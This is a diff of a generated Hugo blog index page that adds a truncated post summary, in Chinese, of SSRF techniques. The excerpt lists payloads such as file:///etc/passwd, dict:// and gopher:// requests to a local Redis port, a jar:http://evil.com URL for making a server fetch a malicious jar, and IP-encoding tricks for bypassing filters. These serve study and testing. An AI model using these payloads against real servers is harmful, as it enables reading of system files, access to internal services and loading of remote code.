@@ -10,7 +10,7 @@
 <meta name="description" content="Posts - h4xk0r blog">
 <meta name="author" content="h4xk0r">
 <link rel="canonical" href="http://localhost:1313/posts/">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.da54c57d4305d35203753b611a507d3c3386f2dc610c5ecafc9137dfc0197499.css" integrity="sha256-2lTFfUMF01IDdTthGlB9PDOG8txhDF7K/JE338AZdJk=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.314abab0bce79c9458c3bcc909ca5440767e8fa2822428ed33ce608ca6f66fa0.css" integrity="sha256-MUq6sLznnJRYw7zJCcpUQHZ&#43;j6KCJCjtM85gjKb2b6A=" rel="preload stylesheet" as="style">
 <link rel="icon" href="http://localhost:1313/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
 <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
@@ -66,11 +66,6 @@
         </div>
         <ul id="menu">
             <li>
-                <a href="http://localhost:1313/posts/" title="档案">
-                    <span class="active">档案</span>
-                </a>
-            </li>
-            <li>
                 <a href="http://localhost:1313/search/" title="搜索 (Alt &#43; /)" accesskey=/>
                     <span>搜索</span>
                 </a>
@@ -94,6 +89,28 @@
     Posts
   </h1>
 </header>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">SSRF
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>伪协议 PHP http/s:// 常用于探测存活主机和开放端口,配合burp
+https://example.com/title?title=http://127.0.0.1:6379 file:// 读取文件内容
+file:///etc/passwd dict:// 字典服务协议，可以通过这个协议执行一些指令.但是dict很难完成复杂的认证，他每次发送的请求都是新建立的连接
+dict://127.0.0.1:6379/info gopher:// gopher协议可以伪造任何基于TCP的应用层协议报文（java不支持）
+gopher://&lt;host&gt;:&lt;port&gt;/_&lt;payload&gt; _ : 占位符。gopher协议在传输中会吃掉路径后的第一个字符 &lt;payload&gt; : 经过URL编码的原始tcp数据流 JAVA file:// 协议	与 PHP 类似
+可以读取本地文件：file:///etc/passwd。
+netdoc:// 协议	它允许你访问并提取 jar 包中的内容。
+Payload: netdoc:///etc/passwd jar:// 协议	它允许你访问并提取 jar 包中的内容。
+语法： jar:{url}!/{entry} 用法： jar:http://evil.com/test.jar!/com/test/Main.class 利用点： 让服务器去下载远程恶意 jar 包。 读取本地 classpath 下的配置文件。 结合某些反序列化漏洞，控制类加载过程。 绕过 IP地址
+进制转换： 浏览器和许多网络库支持非十进制的 IP。 八进制： 0177.0.0.1 十六进制： 0x7f.0x0.0x0.0x1 十进制整数（最隐蔽）： 将 IP 换算成一个超大数字。127.0.0.1 ----&gt; 2130706433 特殊省略写法： 127.0.0.1 可以写成 127.1 或 127.0.1。 0.0.0.0 在 Linux 下通常也会指向本地。 IPv6 绕过： 使用 [::1] 代表 127.0.0.1。 使用 IPv6 格式的内网地址。 利用DNS
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-02-15 00:00:00 +0000 UTC'>February 15, 2026</span>&nbsp;·&nbsp;<span>1 min</span>&nbsp;·&nbsp;<span>h4xk0r</span></footer>
+  <a class="entry-link" aria-label="post link to SSRF" href="http://localhost:1313/posts/ssrf/"></a>
+</article>
 
 <article class="post-entry"> 
   <header class="entry-header">
